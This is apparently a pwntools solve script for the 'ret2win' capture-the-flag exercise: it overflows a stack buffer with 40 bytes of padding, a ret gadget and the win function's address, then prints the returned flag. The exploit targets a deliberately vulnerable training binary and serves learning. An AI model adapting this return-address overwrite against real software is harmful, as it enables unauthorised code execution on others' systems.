#!/usr/bin/env python3

from pwn import *

exe = ELF("./ret2win_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    offset = 40
    ret2win = 0x400756
    ret = 0x40053e
    r.sendlineafter(b'>', b'A'*offset + p64(ret) + p64(ret2win))

    r.recv()
    r.recv()
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
